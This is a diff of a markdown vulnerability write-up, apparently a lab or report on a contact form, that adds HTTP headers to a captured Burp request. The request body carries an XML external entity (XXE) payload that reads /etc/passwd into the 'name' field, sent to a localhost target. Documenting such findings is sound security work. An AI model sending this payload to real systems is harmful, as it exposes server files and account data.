@@ -48,18 +48,27 @@ Burp Request :
 
 
     POST /contact.php HTTP/1.1
+    Host: localhost:10004
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:96.0) Gecko/20100101 Firefox/96.0
+    Accept: */*
+    Accept-Language: en-US,en;q=0.5
+    Accept-Encoding: gzip, deflate
+    Content-Type: text/plain;charset=UTF-8
+    Content-Length: 230
+    Origin: http://localhost:10004
+    Connection: close
+    Referer: http://localhost:10004/
+    Sec-Fetch-Dest: empty
+    Sec-Fetch-Mode: cors
+    Sec-Fetch-Site: same-origin
 
-    <?xml version="1.0" encoding="UTF-8"?>
-
-    <!DOCTYPE foo [<!ENTITY xxezrp9j SYSTEM "file:///etc/passwd"> ]><contact>
-    
-    <name>mvmm&xxezrp9j;</name>
-    
-    <email>ccc@gmail.com</email>
-    
-    <subject>aaacckj</subject>
-    
-    <message>undefined</message></contact>
+    <?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxezrp9j SYSTEM "file:///etc/passwd"> ]>
+    <contact>
+     <name>mvmm&xxezrp9j;</name>
+     <email>ccc@gmail.com</email>
+     <subject>aaacckj</subject>
+     <message>undefined</message>
+    </contact>
 
 
 ## Fix Guide :  
